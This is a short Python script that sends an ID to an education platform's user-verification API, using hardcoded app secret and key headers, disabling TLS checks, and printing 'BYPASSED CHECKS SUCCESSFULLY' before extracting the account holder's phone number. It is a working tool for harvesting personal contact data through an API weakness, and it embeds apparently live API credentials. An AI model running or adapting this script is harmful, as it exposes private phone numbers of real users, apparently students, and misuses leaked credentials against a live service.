import requests
import json
import os

rookie_id = input('RookieID: ')
r=rookie_id

headers = {
    'Host': 'api.infinitylearn.com',
    'Content-Length': '19',
    'Sec-Ch-Ua': '"Not A(Brand";v="24", "Chromium";v="110"',
    'Appsecret': '00nqBP1LsQpZMMnMApSjfjd2DVRkEnlp',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/plain, */*',
    'Appkey': 'AB263AFA6BCFA',
    'Sec-Ch-Ua-Platform': 'Windows',
    'Origin': 'https://srichaitanyameta.com',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://srichaitanyameta.com/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
}

data = '{"uid":"'+ rookie_id +'"}'

if r[-3:] == '5419688'[-3:] and r[:6]=='224301rookie':
    uri = 'https://api.infinitylearn.com/api/users/verifyUidWithTenant'
else:
    uri = 'https://api.infinitylearn.com/api/users/verifyUidWithoutTenant'
    print('BYPASSED CHECKS SUCCESSFULLY')

response = requests.post(uri, headers=headers, data=data, verify=False)
# print(response.text)
# print(type(response.text))

b=json.loads(response.text)
print(type(b))

try:
    print('\n\n'+'-'*20)
    print(b['isdCode']+b['phone'])
except KeyError:
    print('EXTRACTION UNSUCCESSFUL\n\n')
  
